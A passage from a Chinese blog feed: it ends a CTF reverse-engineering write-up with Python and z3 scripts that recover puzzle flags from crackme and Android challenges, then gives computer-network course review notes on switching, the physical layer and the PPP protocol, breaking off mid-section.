class="string">'success'</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li><p>关键点1: 这个fun函数就是rand函数, 其参数s即为随机数种子。</p></li><li><p>关键点2: 如何确定这个随机数种子。</p></li><li><p>关键点3: 如何确定flag的长度。</p></li><li><p>首先: d的长度为72, b的长度为32 。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110221904.png" alt></p><ul><li><p>通过这一部分能知道, 我们最大能够访问到d[71], 而j最大取到31,所以length(flag的长度)最大取到40,所以flag的长度为41。</p></li><li><p>而且, d[0]只能由d[0+0]来访问，即i和j均为0。 d[71]只能由d[31+40]来访问到,所以需要d[0] = arr[0] = 77,d[71] = arr[71] = 184。</p></li><li><p>又因为flag的开头为<code>Syc{</code>, 开头第一个为<code>S</code>,末尾为<code>}</code>。</p></li><li><p>所以b[0] = ord(‘S’)^d[0] = 30, b[31] = ord(‘}’) ^ d[71] = 194</p></li><li><p>又因为 <code>a = struct.unpack(&#39;&lt;I&#39;, flag[length - 4:].encode())[0] &amp; 255</code>,所以随机数种子的取值为 0~255 。</p></li><li><p>然后就可以爆破这个随机数种子了。</p></li><li><p>爆破脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(start, end, s)</span>:</span></span><br><span class="line">    a = <span class="number">32310901</span></span><br><span class="line">    b = <span class="number">1729</span></span><br><span class="line">    c = s</span><br><span class="line">    m = end - start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = int((a * c + b) % m)</span><br><span class="line">        <span class="keyword">yield</span> d</span><br><span class="line">        c = d</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    b = []</span><br><span class="line">    c = fun(<span class="number">1</span>, <span class="number">255</span>, seed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        b.append(next(c))</span><br><span class="line">    <span class="keyword">if</span> b[<span class="number">0</span>] == <span class="number">30</span> <span class="keyword">and</span> b[<span class="number">31</span>] == <span class="number">197</span>:</span><br><span class="line">        <span class="keyword">print</span> seed</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><ul><li><p>得出来 seed 为 49 。b为<code>b = [30, 243, 208, 79, 68, 71, 24, 83, 90, 65, 118,219, 76, 115, 12, 17, 108, 37, 218, 7, 180, 179, 110,175, 88, 181, 248, 45, 8, 249, 114, 197]</code></p></li><li><p>然后利用z3约束求出flag。</p></li><li><p>Z3脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr = [ <span class="number">77</span>,<span class="number">263</span>,<span class="number">394</span>,<span class="number">442</span>,<span class="number">463</span>,<span class="number">512</span>,<span class="number">667</span>,<span class="number">641</span>,</span><br><span class="line">        <span class="number">804</span>,<span class="number">752</span>,<span class="number">885</span>,<span class="number">815</span>,<span class="number">1075</span>,<span class="number">1059</span>,<span class="number">1166</span>,</span><br><span class="line">        <span class="number">1082</span>,<span class="number">1429</span>,<span class="number">1583</span>,<span class="number">1696</span>,<span class="number">1380</span>,<span class="number">1987</span>,</span><br><span class="line">        <span class="number">2263</span>,<span class="number">2128</span>,<span class="number">2277</span>,<span class="number">2387</span>,<span class="number">2670</span>,<span class="number">2692</span>,</span><br><span class="line">        <span class="number">3255</span>,<span class="number">3116</span>,<span class="number">3306</span>,<span class="number">3132</span>,<span class="number">3659</span>,<span class="number">3139</span>,</span><br><span class="line">        <span class="number">3422</span>,<span class="number">3600</span>,<span class="number">3584</span>,<span class="number">3343</span>,<span class="number">3546</span>,<span class="number">3299</span>,</span><br><span class="line">        <span class="number">3633</span>,<span class="number">3281</span>,<span class="number">3146</span>,<span class="number">2990</span>,<span class="number">2617</span>,<span class="number">2780</span>,</span><br><span class="line">        <span class="number">2893</span>,<span class="number">2573</span>,<span class="number">2584</span>,<span class="number">2424</span>,<span class="number">2715</span>,<span class="number">2513</span>,</span><br><span class="line">        <span class="number">2324</span>,<span class="number">2080</span>,<span class="number">2293</span>,<span class="number">2245</span>,<span class="number">2309</span>,<span class="number">2036</span>,</span><br><span class="line">        <span class="number">1944</span>,<span class="number">1931</span>,<span class="number">1817</span>,<span class="number">1483</span>,<span class="number">1372</span>,<span class="number">1087</span>,</span><br><span class="line">        <span class="number">1221</span>,<span class="number">893</span>,<span class="number">785</span>,<span class="number">697</span>,<span class="number">586</span>,<span class="number">547</span>,<span class="number">324</span>,</span><br><span class="line">        <span class="number">177</span>,<span class="number">184</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">30</span>, <span class="number">243</span>, <span class="number">208</span>, <span class="number">79</span>, <span class="number">68</span>, <span class="number">71</span>, <span class="number">24</span>, <span class="number">83</span>, <span class="number">90</span>, <span class="number">65</span>, <span class="number">118</span>,</span><br><span class="line">    <span class="number">219</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">108</span>, <span class="number">37</span>, <span class="number">218</span>, <span class="number">7</span>, <span class="number">180</span>, <span class="number">179</span>, </span><br><span class="line">     <span class="number">110</span>,<span class="number">175</span>, <span class="number">88</span>, <span class="number">181</span>, <span class="number">248</span>, <span class="number">45</span>, <span class="number">8</span>, <span class="number">249</span>, <span class="number">114</span>, <span class="number">197</span>]</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">'flag%d'</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>)]</span><br><span class="line"></span><br><span class="line">length = len(flag)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>):</span><br><span class="line">    solver.add(flag[i]&gt;=<span class="number">32</span>)</span><br><span class="line">    solver.add(flag[i]&lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    solver.add(flag[i] == ord(<span class="string">'Syc&#123;'</span>[i]))</span><br><span class="line">solver.add(flag[length<span class="number">-1</span>] == ord(<span class="string">'&#125;'</span>))</span><br><span class="line"></span><br><span class="line">d = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">72</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a = flag[i] ^ b[j]</span><br><span class="line">        d[i + j] += a</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(d)):</span><br><span class="line">    solver.add(simplify(d[i] == arr[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    Flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span>):</span><br><span class="line">        Flag += chr(eval(str(solver.model().eval(flag[i]))))</span><br><span class="line">    <span class="keyword">print</span> Flag</span><br></pre></td></tr></table></figure><ul><li>不一会就能得出flag,当然手动去逆也不是不可以。</li></ul><h2 id="0x11-Python3"><a href="#0x11-Python3" class="headerlink" title="0x11 Python3"></a>0x11 Python3</h2><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="0x01-Sign-in"><a href="#0x01-Sign-in" class="headerlink" title="0x01 Sign_in"></a>0x01 Sign_in</h2><ul><li>拖入JEB在主函数可以直接找到字符串<code>U3lje1NpOW5fMW5fSTNfRTRzeSF9</code>,base64解码即可得到flag。</li></ul><h2 id="0x02-蒋学姐的秘密"><a href="#0x02-蒋学姐的秘密" class="headerlink" title="0x02 蒋学姐的秘密"></a>0x02 蒋学姐的秘密</h2><ul><li>用户名可以在JEB里面找到,是<code>Syclover</code>, 密码是用户名的MD5, flag为<code>Syc{密码}</code>。</li></ul><h2 id="0x03-正在尝试重新连接"><a href="#0x03-正在尝试重新连接" class="headerlink" title="0x03 正在尝试重新连接"></a>0x03 正在尝试重新连接</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183221.png" alt></p><ul><li>程序通过访问<code>https://0xe4s0n.github.io/download/get_data.json</code>获得一个字符串和一个data，我们访问这个链接可以知道字符串为<code>Syclover</code>,data是一个数组<code>[&quot;33&quot;,&quot;28&quot;,&quot;21&quot;,&quot;20&quot;,&quot;93&quot;,&quot;13&quot;,&quot;13&quot;,&quot;96&quot;,&quot;0&quot;,&quot;11&quot;,&quot;66&quot;,&quot;27&quot;,&quot;51&quot;,&quot;42&quot;,&quot;10&quot;,&quot;12&quot;,&quot;1&quot;,&quot;85&quot;,&quot;41&quot;,&quot;38&quot;,&quot;34&quot;,&quot;23&quot;,&quot;60&quot;,&quot;33&quot;,&quot;23&quot;,&quot;86&quot;,&quot;2&quot;,&quot;94&quot;,&quot;2&quot;,&quot;90&quot;,&quot;4&quot;]</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183403.png" alt></p><ul><li>程序有一个check方法,但是是在native层的, 所以我们分析<code>native-lib.so</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191218.png" alt></p><ul><li>WP里面的F5解密是这样的…而我的F5界面是这样的…一些关键信息都没法正常显示。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191335.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg" alt></p><ul><li>向出题人请教了一下以后得知,需要对a1进行类型转换。</li><li>点一下a1 然后按Y,输出<code>JNIEnv *</code>,然后就very nice了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122192519.png" alt></p><ul><li>稍作修改以后</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122193445.png" alt></p><ul><li><p>逻辑挺简单, 将input与str[i%str__len]异或(其中str已经完成逆序,变成了<code>revolcyS</code>),如果结果与数组相同,则返回1,否则返回0。</p></li><li><p>直接逆回去得到解密脚本:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">s = <span class="string">'Syclover'</span>[::<span class="number">-1</span>]</span><br><span class="line">data = [<span class="string">"33"</span>,<span class="string">"28"</span>,<span class="string">"21"</span>,<span class="string">"20"</span>,<span class="string">"93"</span>,<span class="string">"13"</span>,<span class="string">"13"</span>,<span class="string">"96"</span>,<span class="string">"0"</span>,<span class="string">"11"</span>,<span class="string">"66"</span>,<span class="string">"27"</span>,<span class="string">"51"</span>,<span class="string">"42"</span>,<span class="string">"10"</span>,<span class="string">"12"</span>,<span class="string">"1"</span>,<span class="string">"85"</span>,<span class="string">"41"</span>,<span class="string">"38"</span>,<span class="string">"34"</span>,<span class="string">"23"</span>,<span class="string">"60"</span>,<span class="string">"33"</span>,<span class="string">"23"</span>,<span class="string">"86"</span>,<span class="string">"2"</span>,<span class="string">"94"</span>,<span class="string">"2"</span>,<span class="string">"90"</span>,<span class="string">"4"</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    input+= chr(int(data[i]) ^ ord(s[i%len(s)]))</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure><ul><li>运行即可得到flag。</li></ul><h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络复习</title>
    <url>/2019/12/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/864438.png" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>这篇复习博客是基于老师的PPT和课本来写的，根据老师给的重点内容来写的。博客可以在手机上打开, 就不用再拿着课本来看了。</li></ul><h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h2 id="Q1-计算机网络的概念和功能"><a href="#Q1-计算机网络的概念和功能" class="headerlink" title="Q1 计算机网络的概念和功能"></a>Q1 计算机网络的概念和功能</h2><h3 id="计算机网络的概念："><a href="#计算机网络的概念：" class="headerlink" title="计算机网络的概念："></a>计算机网络的概念：</h3><blockquote><p>计算机网络是指将地理位置不同的多台计算机及其外部设备，通过通信线路连接起来实现资源共享和信息传递的计算机系统。</p></blockquote><ul><li>ps:目前最大的网络–因特网使用TCP/IP协议。</li></ul><h3 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h3><ul><li><p>连通：计算机与计算机之间不论相距多远,都能便捷地交换各种信息。</p></li><li><p>共享：所谓共享就是资源共享，可以是信息共享，软件共享，也可以是硬件共享。</p></li><li><p>ps:计算机网络的基本特点:连通性和共享。</p></li></ul><h2 id="Q2-本章缩写"><a href="#Q2-本章缩写" class="headerlink" title="Q2 本章缩写"></a>Q2 本章缩写</h2><ul><li><code>ISP</code>(Internet Service Provider)，互联网服务提供商。</li><li><code>TCP/IP</code>（Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议）。</li><li><code>Request For Comments（RFC）</code>，是一系列以编号排定的文件。文件收集了有关互联网相关信息，以及UNIX和互联网社区的软件文件。 ps:课本上译为“请求评论”。</li><li><code>C/S服务</code>(客户机-服务器服务)，即Client-Server(C/S)结构。</li><li><code>P2P(peer to peer)</code>，对等连接方式。</li></ul><h2 id="Q3-三种交换方式的比较"><a href="#Q3-三种交换方式的比较" class="headerlink" title="Q3 三种交换方式的比较"></a>Q3 三种交换方式的比较</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218163522.png" alt></p><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><ul><li><p>电路交换：在使用电路交换进行通话之前，必须先拨号建立一条连接，通信线路为通信双方用户专用，数据直达。ps: 电路交换面向连接。</p></li><li><p>优点:实现简单，不存在数据失序问题，实时性强，传输时延非常小，电路交换既适用于传输模拟信号，也适用于传输数字信号。</p></li><li><p>缺点:平均连接建立时间长，信道利用率低，在通信过程中难以实现差错控制。</p></li></ul><h3 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h3><ul><li><p>报文交换：报文交换是以报文为数据交换的单位，报文携带有目标地址、源地址等信息，在交换结点采用存储转发的传输方式。</p></li><li><p>优点：不存在连接建立时延，用户可随时发送报文，提供多目标服务，即一个报文可以同时发送到多个目的地，通信线路的利用率高，允许建立数据传输的优先级。</p></li><li><p>缺点：报文交换的实时性差，报文交换只适用于数字信号，增加了传送时延。</p></li></ul><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><ul><li><p>分组交换：分组交换仍采用存储转发传输方式，但将一个长报文先分割为若干个较短的分组，然后把这些分组（携带源、目的地址和编号信息）逐个地发送出去。</p></li><li><p>优点：分组交换比报文交换的时延小，用户可随时发送分组，提高了通信线路的利用率，发送数据更加灵活，时延更小，网络生存性好。</p></li><li><p>缺点：分组都要加上源、目的地址和分组编号等信息，增加了处理的时间，使控制复杂，时延增加可能出现失序，丢失或重复分组，发送设备和接收设备更加复杂。</p></li></ul><h2 id="Q4-因特网的工作原理"><a href="#Q4-因特网的工作原理" class="headerlink" title="Q4 因特网的工作原理"></a>Q4 因特网的工作原理</h2><ul><li><code>分组交换、存储转发</code></li></ul><h2 id="Q5-网络的分类和网络的评价指标"><a href="#Q5-网络的分类和网络的评价指标" class="headerlink" title="Q5 网络的分类和网络的评价指标"></a>Q5 网络的分类和网络的评价指标</h2><h3 id="网络的分类"><a href="#网络的分类" class="headerlink" title="网络的分类"></a>网络的分类</h3><ul><li><p>按照网络的作用范围进行分类可以分为<code>广域网WAN、城域网MAN、局域网LAN、个人区域网PAN</code>。</p></li><li><p>按照网络的使用者进行分类可以分为<code>公用网、专用网</code>。</p></li></ul><h3 id="网络的评价指标"><a href="#网络的评价指标" class="headerlink" title="网络的评价指标"></a>网络的评价指标</h3><ol><li>速率: 数据的传送速率，也称为<code>数据率</code>。</li><li>带宽: 计算机网络中的带宽指的是在单位时间内网络中的某信道所能通过的最高数据率，单位是<code>bit/s</code>。</li><li>吞吐量: 表示单位时间内通过某个网络的实际的数据量。</li><li>时延: 时延分为: <code>发送时延、传播时延、处理时延、排队时延</code>。</li></ol><ul><li>ps: 降低处理时延比较好。</li></ul><h2 id="Q6服务与协议"><a href="#Q6服务与协议" class="headerlink" title="Q6服务与协议"></a>Q6服务与协议</h2><ul><li><p>服务是垂直的,服务是由下层向上层通过层间接口提供的。</p></li><li><p>协议是水平的，即协议是控制对等实体之间通信的规则的集合。</p></li><li><p>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。</p></li><li><p>要实现本层协议，还需要使用下层所提供的服务。</p></li><li><p>本层的服务用户只能看见服务而无法看见下面的协议。</p></li><li><p>下面的协议对上面的服务用户是透明的。</p></li></ul><h2 id="Q7-理解31页计算机网络体系结构"><a href="#Q7-理解31页计算机网络体系结构" class="headerlink" title="Q7 理解31页计算机网络体系结构"></a>Q7 理解31页计算机网络体系结构</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218175652.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218175728.png" alt></p><ul><li>在五层协议的结构体系中:</li></ul><ol><li>物理层解决01的传输问题。</li><li>数据链路层解决数据帧的传输问题。</li><li>网络层解决数据包从起点到终点的传输问题。</li><li>运输层解决端与端之间的通讯问题。</li></ol><h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h1><h2 id="Q1-物理层的功能"><a href="#Q1-物理层的功能" class="headerlink" title="Q1 物理层的功能"></a>Q1 物理层的功能</h2><ul><li>物理层负责数据的比特流如何在传输媒体上的传输,即物理层负责解决0和1的传输问题。</li></ul><h2 id="Q2-理解一些概念"><a href="#Q2-理解一些概念" class="headerlink" title="Q2 理解一些概念"></a>Q2 理解一些概念</h2><h3 id="模拟信号和数字信号"><a href="#模拟信号和数字信号" class="headerlink" title="模拟信号和数字信号"></a>模拟信号和数字信号</h3><ul><li>模拟信号(又称连续信号): 代表消息的参数的取值是连续的。</li><li>数字信号(又称离散信号): 代表消息的参数的取值是离散的。</li></ul><h3 id="有关信道的几个概念"><a href="#有关信道的几个概念" class="headerlink" title="有关信道的几个概念"></a>有关信道的几个概念</h3><ul><li><p>单向通信（单工通信）—— 只能有一个方向的通信而没有反方向的交互。ps:例如打印机,只能计算机向打印机传输数据。</p></li><li><p>双向交替通信（半双工通信）—— 通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。ps:例如对讲机。</p></li></ul><ul><li>双向同时通信（全双工通信）—— 通信的双方可以同时发送和接收信息。 ps:例如电话。</li></ul><h3 id="基带信号与带通信号"><a href="#基带信号与带通信号" class="headerlink" title="基带信号与带通信号"></a>基带信号与带通信号</h3><ul><li><p>基带信号：来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。</p></li><li><p>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制(modulation)。</p></li><li><p>带通信号：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道）。</p></li></ul><h2 id="Q3-信号调制的方法"><a href="#Q3-信号调制的方法" class="headerlink" title="Q3 信号调制的方法"></a>Q3 信号调制的方法</h2><ul><li>最基本的二元制调制方法有以下几种：</li><li>调幅(AM)：载波的振幅随基带数字信号而变化。</li><li>调频(FM)：载波的频率随基带数字信号而变化。</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218194213.png" alt></p><h2 id="Q4-香农公式和奈氏准则"><a href="#Q4-香农公式和奈氏准则" class="headerlink" title="Q4 香农公式和奈氏准则"></a>Q4 香农公式和奈氏准则</h2><ul><li><p>奈氏准则告诉我们:<code>在任何信道中,码元传输的速率是有上限的,传输速率超过此上限,就会出现严重的码间串扰问题,使接收端对码元的判决(即识别)成为不可能</code>。</p></li><li><p>香农公式: <code>C=W*log₂（1+S/N) （bit/s)</code></p></li><li><p>其中C为信道的极限信息传输速率，W 为信道的带宽（以 Hz 为单位），S 为信道内所传信号的平均功率，N 为信道内部的高斯噪声功率。</p></li></ul><h2 id="Q5-传输媒介"><a href="#Q5-传输媒介" class="headerlink" title="Q5 传输媒介"></a>Q5 传输媒介</h2><h3 id="有线-导引型传输媒介"><a href="#有线-导引型传输媒介" class="headerlink" title="有线(导引型传输媒介)"></a>有线(导引型传输媒介)</h3><ul><li><p>双绞线: 造价低，稳定性强，施工方便</p></li><li><p>同轴电缆: 抗干扰能力好，传输数据稳定，价格也便宜</p></li><li><p>光缆: 频带较宽，不受电磁干扰，衰减较小、</p></li></ul><h3 id="无线-非导引型传输媒介"><a href="#无线-非导引型传输媒介" class="headerlink" title="无线(非导引型传输媒介)"></a>无线(非导引型传输媒介)</h3><ul><li>无线传输所使用的频段很广。</li><li>短波通信主要是靠电离层的反射，但短波信道的通信质量较差。</li><li>微波在空间主要是直线传播。</li></ul><h2 id="Q6-信道复用技术"><a href="#Q6-信道复用技术" class="headerlink" title="Q6 信道复用技术"></a>Q6 信道复用技术</h2><h3 id="频分复用-FDM"><a href="#频分复用-FDM" class="headerlink" title="频分复用 FDM"></a>频分复用 FDM</h3><ul><li>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</li><li>频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。</li></ul><h3 id="时分复用-TDM"><a href="#时分复用-TDM" class="headerlink" title="时分复用 TDM"></a>时分复用 TDM</h3><blockquote><p>时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。<br>每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。<br>TDM 信号也称为等时(isochronous)信号。<br>时分复用的所有用户是在不同的时间占用同样的频带宽度。</p></blockquote><ul><li>时分复用可能会造成线路资源的浪费</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218203312.png" alt></p><ul><li>概念看着很难理解, 可以看看别的文章。</li></ul><p><a href="https://baijiahao.baidu.com/s?id=1599860461141714704&wfr=spider&for=pc" target="_blank" rel="noopener">传送门</a></p><h3 id="统计时分复用-STDM"><a href="#统计时分复用-STDM" class="headerlink" title="统计时分复用 STDM"></a>统计时分复用 STDM</h3><ul><li>时分复用的改进版。</li></ul><h3 id="波分复用-WDM"><a href="#波分复用-WDM" class="headerlink" title="波分复用 WDM"></a>波分复用 WDM</h3><ul><li>光的频分复用。</li></ul><h3 id="码分复用-CDM"><a href="#码分复用-CDM" class="headerlink" title="码分复用 CDM"></a>码分复用 CDM</h3><ul><li><p>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。</p></li><li><p>每一个比特时间划分为 m 个短的间隔，称为码片(chip)</p></li><li><p>码分复用利用了码分多址 <code>CDMA (Code Division Multiple Access)</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218205333.png" alt></p><ul><li>每个站分配的码片序列不仅必须各不相同，并且还必须互相正交(orthogonal)。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218205621.png" alt></p><ul><li><p>关于内积:</p></li><li><p>假设S 为 (-1，-1，1，-1), T 为(-1，1，-1，-1),则内积为:<code>-1*-1 + -1*1 + 1*-1 + -1*-1</code>。即对应位置相乘然后相加。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218210027.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191218210048.png" alt></p><h2 id="Q7-本章缩写"><a href="#Q7-本章缩写" class="headerlink" title="Q7 本章缩写"></a>Q7 本章缩写</h2><ul><li><p>STP（Spanning Tree Protocol）是生成树协议的英文缩写，可应用于计算机网络中树形拓扑结构建立，主要作用是防止网桥网络中的冗余链路形成环路工作。<code>STP 同时也是屏蔽双绞线Shielded Twisted Pair的缩写</code>。</p></li><li><p><code>UTP</code> ：非屏蔽双绞线(Unshielded Twisted Pair)</p></li><li><p><code>CDMA</code> : (Code Division Multiple Access) 码分多址。</p></li><li><p><code>ADSL</code> : (Asymmetric Digital Subscriber Line） 非对称数字用户线路。</p></li></ul><h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章 数据链路层"></a>第三章 数据链路层</h1><h2 id="Q1-数据链路层的功能和协议"><a href="#Q1-数据链路层的功能和协议" class="headerlink" title="Q1 数据链路层的功能和协议"></a>Q1 数据链路层的功能和协议</h2><ul><li><p>数据链路层的功能主要是解决临结点间数据帧的传输问题,可以概括为三个环节：即<code>封装成帧、透明传输、差错检测</code>。</p></li><li><p>协议:主要协议有<code>PPP协议(点对点协议)</code>和<code>CSMA/CD协议(载波侦听/冲突检测)</code>。</p></li></ul><h2 id="Q2-PPP协议的工作原理"><a href="#Q2-PPP协议的工作原理" class="headerlink" title="Q2 PPP协议的工作原理"></a>Q2 PPP协议的工作原理</h2><ul><li>ps:这个内容老师PPT上也没有, 课本上也没有, PPT和课本上共有的是PPP协议的特点、组成、帧格式、工作状态。下面是我百度的一些PPP工作原理的答案:</li></ul><blockquote><p>PPP协议的运行分为四个阶段：<br>第一阶段：建立链路（LCP）<br>第二阶段：验证（PAP/CHAP）<br>第三阶段：网络控制协商（NCP）<br>第四阶段：终止PPP链路（LCP）</p></blockquote><ul><li>为了更好地应对有关PPP协议的题目,这里也把PPP的特点、组成、帧格式这些我个人认为比其工作原理更有可能考的问题记一下:</li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>(1) 简单：在同一条物理链路上进行点对点的数据传输，对数据链路层的帧不进行纠错，不需要序号，不需要流量控制。</li><li>(2) 封装成帧：加入帧界定符。</li><li>(3) 透明性：采用字节填充法。</li><li>(4) 支持多种网络层协议：在同一条物理链路上同时支持多种网络层协议（如IP和IPX等）的运行。</li><li>(5) 支持多种链路类型：PPP必须能够在多种类型的链路上运行，例如串行或并行链路。</li><li>(6) 差错检测：接收方收到一个帧后进行CRC检验，若正确就收下这个帧，反之则丢弃。</li><li>(7) 检测连接状态：自动检测链路是否处于正常工作状态。</li></ul><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>PPP 协议有三个组成部分：</li></ul><ol><li>一个将 IP 数据报封装到串行链路的方法。</li><li>链路控制协议 LCP (Link Control Protocol)。</li><li>网络控制协议 NCP (Network Control Protocol)。</li></ol><h3 id="帧格式"><a href="#帧格式" class="headerlink" title="帧格式"></a>帧格式</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219113613.png" alt></p><ul><li><p>对于首部的<code>FAC</code>,其中<code>标志字段F = 0x7E</code>,<code>地址字段A只置为0xFF，实际上不起作用</code>,<code>控制字段C通常置为0x03</code>。</p></li><li><p>尾部的<code>FCS</code>是帧校验序列,是用于CRC校验的标志位。</p></li></ul><blockquote><p>所有的 PPP 帧的长度都是整数字节,即不存在如1505.5字节大小的PPP帧。</p></blockquote><h2 id="Q3-数据链路层传输数据的基本单位和完成工作的基本原则"><a href="#Q3-数据链路层传输数据的基本单位和完成工作的基本原则" class="headerlink" title="Q3 数据链路层传输数据的基本单位和完成工作的基本原则"></a>Q3 数据链路层传输数据的基本单位和完成工作的基本原则</h2><ul><li><p>基本单位: <code>帧</code></p></li><li><p>ps:各自传输数据的基本单位: <code>网络层: 包</code>、<code>数据链路层: 帧</code>、<code>物理层: 比特</code>。</p></li><li><p>完成工作的基本原则:</p></li></ul><h3 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h3><ul><li>首先是<code>封装成帧</code>，封装成帧(framing)就是在一段数据的前后分别添加<code>首部和尾部</code>，然后就构成了一个帧。确定帧的界限。首部和尾部的一个重要作用就是进行<code>帧定界</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219115512.png" alt></p><h3 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h3><ul><li>我们在完成了<code>封装成帧</code>又出现了新的问题, 我们该如何处理如下图的情况？</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219115725.png" 